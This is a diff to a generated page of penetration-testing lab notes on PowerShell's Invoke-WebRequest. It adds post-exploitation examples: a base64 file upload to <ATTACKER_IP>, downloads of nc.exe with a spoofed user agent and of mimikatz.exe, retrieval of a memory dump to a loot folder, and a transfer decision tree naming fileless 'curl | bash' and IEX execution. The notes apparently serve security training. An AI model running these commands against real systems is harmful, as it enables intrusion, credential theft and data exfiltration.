@@ -9,6 +9,125 @@ hideFooterPagination: true
 
 {/* Generated from Commands/invoke-webrequest.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Invoke-WebRequest: choose the operation and read the result
+
+Download a file in PowerShell.
+
+### What the result establishes
+
+Inspect response status and the resulting file, especially if the endpoint redirects or requires authentication.
+
+### Prerequisites and common failures
+
+Use -OutFile for a download; a downloaded login/error page can have the expected filename while containing no useful artifact.
+
+### Example 1: Commands
+
+Run in: **Windows PowerShell**.
+
+```powershell
+Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.exe' -OutFile 'C:\Users\Public\file.exe'
+```
+
+### Example 2: PowerShell Web Downloads
+
+Run in: **Saved lab example**.
+
+```powershell
+Invoke-WebRequest http://<IP>/file.exe -OutFile file.exe
+```
+
+Saved context: [File Transfers for Linux and Windows — PowerShell Web Downloads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-downloads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: PowerShell Web Downloads
+
+Run in: **Saved lab example**.
+
+```powershell
+Invoke-WebRequest http://<IP>/file.exe -UseBasicParsing -OutFile file.exe
+```
+
+Saved context: [File Transfers for Linux and Windows — PowerShell Web Downloads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-downloads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Spoofing User Agents
+
+Run in: **Saved lab example**.
+
+```powershell
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://<IP>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+
+Saved context: [File Transfers for Linux and Windows — Spoofing User Agents](/post-exploitation/file-transfers-cheat-sheet#spoofing-user-agents). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: PowerShell Web Uploads
+
+Run in: **Saved lab example**.
+
+```powershell
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\path\to\file' -Encoding Byte))
+Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
+```
+
+Saved context: [File Transfers for Linux and Windows — PowerShell Web Uploads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-uploads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Quick Decision Tree
+
+Run in: **Saved lab example**.
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+Saved context: [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Quick-start command cheat (run first, always)
+
+Run in: **Saved lab example**.
+
+```powershell
+# 1. Automated
+iwr -Uri "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" -OutFile "C:\temp\winPEAS.exe"
+C:\temp\winPEAS.exe
+
+# 2. Manual "big 5"
+whoami /priv
+whoami /groups
+systeminfo
+net user; net localgroup administrators
+Get-WmiObject win32_service | ? {$_.StartMode -eq 'Auto' -and $_.State -ne 'Running'}
+```
+
+Saved context: [Privilege Escalation: Choose a Checklist — Quick-start command cheat (run first, always)](/privesc/index#quick-start-command-cheat-run-first-always-2). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Download a file in PowerShell.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=invoke-webrequest) · [All tools](/index)
@@ -39,11 +158,25 @@ Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.exe' -OutFile 'C:\U
 Invoke-WebRequest http://<IP>/file.exe -OutFile file.exe
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — PowerShell Web Downloads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-downloads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **File Transfers for Linux and Windows**
 
 ```powershell
 Invoke-WebRequest http://<IP>/file.exe -UseBasicParsing -OutFile file.exe
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — PowerShell Web Downloads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-downloads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -57,6 +190,13 @@ Invoke-WebRequest http://<IP>/file.exe -UseBasicParsing -OutFile file.exe
 $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\path\to\file' -Encoding Byte))
 Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — PowerShell Web Uploads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-uploads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -94,6 +234,13 @@ UPLOADING FROM LINUX:
 └── Nothing works?      → Start python3 -m http.server on target, wget from attacker
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: Quick Decision Tree](/enumeration/citrix-netscaler#example-6-quick-decision-tree) · [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Spoofing User Agents">
@@ -106,6 +253,13 @@ UPLOADING FROM LINUX:
 $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
 Invoke-WebRequest http://<IP>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Spoofing User Agents](/post-exploitation/file-transfers-cheat-sheet#spoofing-user-agents)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -127,6 +281,13 @@ copy \\172.16.119.13\share\tool.exe C:\Users\Public\
 copy \\tsclient\kali\tool.exe C:\Users\Public\
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Downloading TO a Windows target](/cheatsheets/pivoting-file-transfer#downloading-to-a-windows-target)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pivoting and File Transfer: Field Reference**
 
 Context from the notebook: Invoke-WebRequest -OutFile  downloads a  single file , never a folder. Point it at the exact  .exe . A folder URL just saves the directory‑listing HTML.
@@ -134,6 +295,13 @@ Context from the notebook: Invoke-WebRequest -OutFile  downloads a  single file 
 ```text
 Invoke-WebRequest -OutFile
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Downloading TO a Windows target](/cheatsheets/pivoting-file-transfer#downloading-to-a-windows-target)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -156,6 +324,13 @@ net user; net localgroup administrators
 Get-WmiObject win32_service | ? {$_.StartMode -eq 'Auto' -and $_.State -ne 'Running'}
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Privilege Escalation: Choose a Checklist — Quick-start command cheat (run first, always)](/privesc/index#quick-start-command-cheat-run-first-always-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Transfer (full detail in the Pivoting cheatsheet)">
@@ -173,6 +348,13 @@ powershell -c "Invoke-WebRequest http://172.16.119.13:8080/mimikatz.exe -OutFile
 *Evil-WinRM* PS> download C:\Temp\l.dmp /home/kali/loot/
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — Transfer (full detail in the Pivoting cheatsheet)](/cheatsheets/windows-post-exploitation#transfer-full-detail-in-the-pivoting-cheatsheet)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="⏱️ DECISION HEADER">
@@ -187,6 +369,21 @@ Context from the notebook: Download a tool  to  a Windows target Invoke-WebReque
 Invoke-WebRequest
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — ⏱️ DECISION HEADER](/cheatsheets/pivoting-file-transfer#-decision-header) · [Pivoting and File Transfer: Field Reference — 🧯 CAVEATS TABLE](/cheatsheets/pivoting-file-transfer#-caveats-table) · [File Transfers for Linux and Windows — User Agent Detection](/post-exploitation/file-transfers-cheat-sheet#user-agent-detection)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
